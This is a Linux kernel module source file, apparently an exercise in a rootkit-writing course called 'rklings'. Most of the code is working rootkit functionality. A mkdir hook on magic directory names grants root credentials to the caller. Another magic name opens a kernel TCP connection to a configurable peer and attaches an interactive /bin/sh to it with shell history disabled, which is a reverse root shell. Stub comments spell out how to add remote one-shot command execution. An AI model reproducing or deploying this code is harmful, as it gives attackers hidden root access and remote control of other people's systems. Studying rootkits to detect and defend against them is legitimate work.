// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/in.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/pid.h>
#include <linux/sched/signal.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/workqueue.h>
#include <net/net_namespace.h>

#include "rklings_hook.h"

#define RK_CMD_MAX 256

struct rk_shell_slot {
	struct socket *sock;
	struct file *file;
	struct mutex lock;
	struct work_struct work;
	bool busy;
	char cmd[RK_CMD_MAX];
};

static struct rk_shell_slot interactive_slot;
static struct rk_shell_slot exec_slot;

static unsigned short shell_port = 4444;
module_param(shell_port, ushort, 0600);

static char peer_addr_str[16] = "127.0.0.1";
module_param_string(peer_address, peer_addr_str, sizeof(peer_addr_str), 0400);

static char *shell_envp[] = {
	"HOME=/",
	"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
	"TERM=linux",
	"HISTFILE=/dev/null",
	NULL,
};

/* Install a file as a specific file descriptor number. */
static int rk_install_fd(struct file *file, unsigned int wanted)
{
	int fd;

	fd = get_unused_fd_flags(0);
	if (fd < 0)
		return fd;
	if ((unsigned int)fd != wanted) {
		put_unused_fd(fd);
		return -EBUSY;
	}
	get_file(file);
	fd_install(fd, file);
	return 0;
}

/* Init callback for call_usermodehelper: install socket as fd 0, 1, 2. */
static int rk_shell_init_fn(struct subprocess_info *info,
			     struct cred *new)
{
	struct rk_shell_slot *slot = info->data;
	unsigned int fd;
	int error;

	(void)new;
	if (!slot->file)
		return -ECANCELED;
	for (fd = 0; fd < 3; fd++) {
		error = rk_install_fd(slot->file, fd);
		if (error)
			return error;
	}
	return 0;
}

/* Create a TCP socket and connect to the configured peer. */
static int rk_slot_connect(struct rk_shell_slot *slot)
{
	struct sockaddr_in peer = {
		.sin_family = AF_INET,
		.sin_port = htons(shell_port),
	};
	struct socket *sock = NULL;
	int error;

	peer.sin_addr.s_addr = in_aton(peer_addr_str);

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
				 IPPROTO_TCP, &sock);
	if (error)
		return error;

	error = kernel_connect(sock, (struct sockaddr *)&peer,
			       sizeof(peer), 0);
	if (error) {
		sock_release(sock);
		return error;
	}

	slot->sock = sock;
	return 0;
}

/* Convert the slot socket into a file for fd installation. */
static int rk_slot_make_file(struct rk_shell_slot *slot)
{
	struct file *file;

	file = sock_alloc_file(slot->sock, 0, NULL);
	if (IS_ERR(file))
		return PTR_ERR(file);

	/* sock_alloc_file takes ownership of the socket. */
	slot->file = file;
	return 0;
}

/* Release the slot's file (which also releases the socket). */
static void rk_slot_cleanup(struct rk_shell_slot *slot)
{
	if (slot->file) {
		fput(slot->file);
		slot->file = NULL;
		/* sock_alloc_file took ownership, so sock is gone. */
		slot->sock = NULL;
	} else if (slot->sock) {
		sock_release(slot->sock);
		slot->sock = NULL;
	}
}

/* Work function for the interactive shell slot. */
static void rk_interactive_work(struct work_struct *work)
{
	struct rk_shell_slot *slot;
	struct subprocess_info *sub;
	char *argv[] = { "/bin/sh", "-i", NULL };
	int error;

	slot = container_of(work, struct rk_shell_slot, work);

	error = rk_slot_connect(slot);
	if (error)
		goto out;

	error = rk_slot_make_file(slot);
	if (error)
		goto out;

	sub = call_usermodehelper_setup("/bin/sh", argv, shell_envp,
					GFP_KERNEL, rk_shell_init_fn,
					NULL, slot);
	if (!sub) {
		error = -ENOMEM;
		goto out;
	}

	/* Block until the shell process exits. */
	call_usermodehelper_exec(sub, UMH_WAIT_PROC);

out:
	rk_slot_cleanup(slot);
	mutex_lock(&slot->lock);
	slot->busy = false;
	mutex_unlock(&slot->lock);
}

/* TODO: Work function for the exec shell slot.
 *
 * This should:
 * 1. Build argv as { "/bin/sh", "-c", slot->cmd, NULL }.
 * 2. Connect the slot socket with rk_slot_connect.
 * 3. Create a file from the socket with rk_slot_make_file.
 * 4. Set up and exec the helper with UMH_WAIT_PROC.
 * 5. Clean up and clear busy + cmd on every path.
 */
static void rk_exec_work(struct work_struct *work)
{
	struct rk_shell_slot *slot;

	slot = container_of(work, struct rk_shell_slot, work);

	/* TODO: implement one-shot command execution */

	rk_slot_cleanup(slot);
	mutex_lock(&slot->lock);
	slot->busy = false;
	slot->cmd[0] = '\0';
	mutex_unlock(&slot->lock);
}

/* Try to start the interactive shell. */
static int rk_start_interactive(void)
{
	int error = 0;

	mutex_lock(&interactive_slot.lock);
	if (interactive_slot.busy) {
		error = -EBUSY;
		goto unlock;
	}
	interactive_slot.busy = true;
	schedule_work(&interactive_slot.work);

unlock:
	mutex_unlock(&interactive_slot.lock);
	return error;
}

/* TODO: Try to start an exec shell with the given command.
 *
 * This should:
 * 1. Validate that cmd is non-empty and fits in RK_CMD_MAX.
 * 2. Lock the exec slot, check busy, set busy, copy cmd.
 * 3. Schedule the exec work item.
 */
static int rk_start_exec(const char *cmd)
{
	(void)cmd;
	return -ENOSYS;
}

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

RK_ON_MKDIR(name) {
	/* Privilege escalation. */
	if (strcmp(name, "rklings.e") == 0)
		return rk_escalate();

	/* Interactive shell. */
	if (strcmp(name, "rklings.shell") == 0)
		return rk_start_interactive();

	/* TODO: dispatch rklings.exec.CMD to rk_start_exec */

	return -ENOENT;
}

static void rk_slot_init(struct rk_shell_slot *slot, work_func_t fn)
{
	mutex_init(&slot->lock);
	INIT_WORK(&slot->work, fn);
	slot->busy = false;
	slot->sock = NULL;
	slot->file = NULL;
	slot->cmd[0] = '\0';
}

static void rk_slot_stop(struct rk_shell_slot *slot)
{
	mutex_lock(&slot->lock);
	if (slot->sock)
		kernel_sock_shutdown(slot->sock, SHUT_RDWR);
	mutex_unlock(&slot->lock);
	cancel_work_sync(&slot->work);
}

static int __init rk_init(void)
{
	rk_slot_init(&interactive_slot, rk_interactive_work);
	rk_slot_init(&exec_slot, rk_exec_work);
	return rk_hook_start();
}

static void __exit rk_exit(void)
{
	rk_hook_stop();
	rk_slot_stop(&interactive_slot);
	rk_slot_stop(&exec_slot);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings exec shell");
